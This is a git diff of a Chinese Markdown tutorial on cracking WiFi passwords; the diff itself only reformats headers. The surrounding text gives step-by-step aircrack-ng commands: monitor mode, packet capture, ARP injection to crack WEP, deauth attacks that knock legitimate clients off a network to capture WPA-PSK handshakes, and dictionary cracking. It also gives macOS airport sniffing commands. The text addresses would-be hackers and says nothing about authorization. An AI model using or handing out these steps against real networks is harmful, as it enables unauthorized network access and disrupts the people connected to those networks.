@@ -9,13 +9,13 @@ ifconfig -a查看网卡
 ifconfig wlan0 up加载网卡
 iwconfig只查看无线网卡
 ```
-###2、激活无线网卡只monitor监听模式###
+###2、激活无线网卡只monitor监听模式
 ```
 airmon-ng start 上面查看的网卡名
 
 monitor mode enabled on mon0便是已启动监听模式，监听模式下适配器名称变更为mon0。
 ```
-###3、探测无线网络，抓取无线数据包###
+###3、探测无线网络，抓取无线数据包
 ```
 airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡
 
@@ -26,7 +26,7 @@ airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
 -w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。
 ```
 
-###4、对目标AP使用ArpRequest注入攻击，加速数据包的获取###
+###4、对目标AP使用ArpRequest注入攻击，加速数据包的获取
 ```
 aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
 参数解释：
@@ -38,18 +38,18 @@ aireplay-ng -3 -b AP的mac -h 客户端的mac mon0
 此时回到airodump-ng 会看到packets栏的数字在飞速递增。
 ```
 
-###5、打开aircrack-ng，开始破解WEP###
+###5、打开aircrack-ng，开始破解WEP
 在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功就等待数据报文的继续抓取然后多试几次。注意，此处不需要将进行注入攻击的Shell关闭，而是另外开一个Shell进行同步破解。输入命令如下：
 ```
 aircrack-ng 捕获的ivs文件
 ```
-##二、wap-psk破解##
-###1、升级Aircrack-ng###
+##二、wap-psk破解
+###1、升级Aircrack-ng
 最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：
 ```
 airodump-ng-oui-update
 ```
-###2、载入并激活无线网卡至monitor即监听模式###
+###2、载入并激活无线网卡至monitor即监听模式
 载入无线网卡的顺序及命令部分，依次输入下述命令
 ```
 startx            进入到图形界面
@@ -57,7 +57,7 @@ ifconfig –a       查看无线网卡状态
 ifconfig  wlan0  up     载入无线网卡驱动
 airmon-ng  start  wlan0  激活网卡到monitor模式
 ```
-###3、探测无线网络，抓取无线数据包###
+###3、探测无线网络，抓取无线数据包
 ```
 airodump-ng -c 6 –w longas mon0
 参数解释：
@@ -65,7 +65,7 @@ airodump-ng -c 6 –w longas mon0
 -w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，这里我就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longas.cap，而是longas-01.cap。
 mon0 为之前已经载入并激活监听模式的无线网卡。
 ```
-###4、进行Deauth攻击加速破解过程###
+###4、进行Deauth攻击加速破解过程
 和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：
 ```
 aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
@@ -74,14 +74,14 @@ aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0
 -a 后跟AP的MAC地址；
 -c 后跟客户端的MAC地址；
 ```
-###5、开始破解WPA-PSK###
+###5、开始破解WPA-PSK
 在成功获取到无线WPA-PSK验证数据报文后，就可以开始破解，输入命令如下：
 ```
 aircrack-ng -w dic 捕获的cap文件 
 -w 后跟预先制作的字典，这里是BT4下默认携带的字典。
 ```
 
-###命令合集###
+###命令合集
 ```
 aircrack-ng
 主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
@@ -101,20 +101,20 @@ tools
 其他用于辅助的工具，如airdriver-ng、packetforge-ng等
 ```
 ---
-#破解WIFI密码总结#
+#破解WIFI密码总结
 这里我总结一下常用的流程，其实只有3个步骤。
-###获取搜索到的wifi###
+###获取搜索到的wifi
 ```
 airport -s
 SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
 ```
-###开始监听###
+###开始监听
 ```
 sudo airport en0 sniff 1
 en0是网卡   1是要抓包的信道
 抓包.cap文件默认保存在/tmp  -w可以改变保存路径
 ```
-###解析###
+###解析
 ```
 aircrack-ng -w 1.txt 1.cap
 1.txt是字典暴  1.cap是抓包文件
